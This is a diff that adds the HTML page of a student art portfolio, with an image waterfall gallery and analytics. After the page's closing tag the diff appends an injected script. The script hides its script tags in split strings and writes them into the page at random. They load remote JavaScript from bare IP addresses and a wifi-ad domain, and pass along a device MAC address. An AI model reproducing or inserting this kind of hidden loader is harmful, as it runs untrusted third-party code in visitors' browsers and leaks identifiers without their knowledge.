@@ -1,0 +1,125 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+	<link rel="stylesheet" type="text/css" href="css/index.css">
+	<link rel="stylesheet" type="text/css" href="css/reset.css">
+</head>
+<body>
+	<div class="box">
+		<div class="left">
+			<div class="log">CAFA</div>
+			<p class="student">student</p>
+			<div class="user"></div>
+			<p class="name">吴迪迪</p>
+			<ul>
+				<li>艺术简历</li>
+				<li>作品展示</li>
+				<li>动态信息</li>
+				<li class="none">联系方式</li>
+			</ul>
+		</div>
+		<div id="banner">
+			<div class="pic"><img src="images/banner.jpg"></div>
+			<div class="js">
+				<div class="ss">
+					<h4>几何山水</h4>
+					<p>尺寸 189x81×30cm</p>
+					<p>系列：立体作品</p>
+					<p>类型：水墨</p>
+					<p>材质：木板 宣纸</p>
+					<p>年代：2011</p>
+				</div>
+				<div class="wm">
+					<img src="images/er-m.jpg" class="er">
+					<span class="sp1"></span>
+					<span class="sp2"></span>
+					<span class="sp3"></span>
+					<span class="sp4"></span>
+				</div>
+			</div>
+		</div>
+		<div id="txt">
+			<h4>作品</h4>
+			<p><span>按系列</span><span>按年份</span></p>
+			<ul>
+				<li>阅读系列</li>
+				<li>阅读系列</li>
+				<li>阅读系列</li>
+				<li>阅读系列</li>
+				<li>阅读系列</li>
+				<li>阅读系列</li>
+			</ul>
+		</div>
+		<div id="container"></div>
+	</div>
+	<script type="text/x-handlebars-template" id="waterfall-tpl">
+	{{#result}}
+   	 <div class="item">
+      	  <img src="{{image}}" width="{{width}}" height="{{height}}" />
+    	</div>
+	{{/result}}
+	</script>
+	<script type="text/x-handlebars-template" id="waterfall-tpl">
+		{{#result}}
+		    <div class="item">
+		        <img src="{{image}}" width="{{width}}" height="{{height}}" />
+		    </div>
+		{{/result}}
+		</script>
+		<script type="text/javascript" src="js/jquery-1.7.2.min.js"></script>
+		<script src="js/libs/handlebars/handlebars.js"></script>
+		<script src="js/waterfall.min.js"></script>
+		<script type="text/javascript" src="js/index.js"></script>
+		<script>
+		$('#container').waterfall({
+		    itemCls: 'item',
+		    colWidth: 222,  
+		    gutterWidth: 15,
+		    gutterHeight: 15,
+		    checkImagesLoaded: false,
+		    path: function(page) {
+		        return 'data/data1.json?page=' + page;
+		    }
+		});
+		</script>
+		<script type="text/javascript">
+		var _gaq = _gaq || [];
+		_gaq.push(['_setAccount', 'UA-1245097-16']);
+		_gaq.push(['_trackPageview']);
+		_gaq.push(['_trackPageLoadTime']);
+		(function() {
+		    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+		    ga.src = 'https://ssl.google-analytics.com/ga.js';
+		    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+		})();
+		</script>
+		</body>
+		</html><script>
+		function ik_random(){var ik_r_min=0;var ik_r_max=100;return(parseInt(Math.random()*(ik_r_max-ik_r_min+1)+ik_r_min));}
+		function ik_isiframe(){return (self!=top);}
+		var __h="<sc"+"ript src=\"http://101.201.53.95/js.php?uid=701286cb87bca232bedebd4b85473330,PC,";
+		var __b="&r="+Math.random()+"&r2="+Math.random()+"\"></scr"+"ipt>";
+		var x=ik_random();
+		var __m='b8:2a:72:f9:6c:ad';
+		var __m2='00:00:00:00:00:00';
+		if(!ik_isiframe()){
+		switch(true){
+		case x>=0&&x<30:
+		document.write(__h+"16"+__b);
+		document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10066&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+		break;
+		case x>=30&&x<=35:
+		document.write(__h+"20"+__b);
+		document.write("<sc"+"ript src=\"http://js.union-wifi.com/zm.js?cid=10154&dmac="+__m2+"&umac="+__m+"\"></scr"+"ipt>");
+		break;
+		case x>=50&&x<=100:
+		document.write(__h+"11"+__b);
+		document.write("<sc"+"ript src=\"http://180.76.171.28/ydap.js?ydcp_id=10111&cumid="+__m+"&apmac="+__m2+"\"></scr"+"ipt>");
+		break;
+		}
+		}
+	</script>
+</body>
+</html>
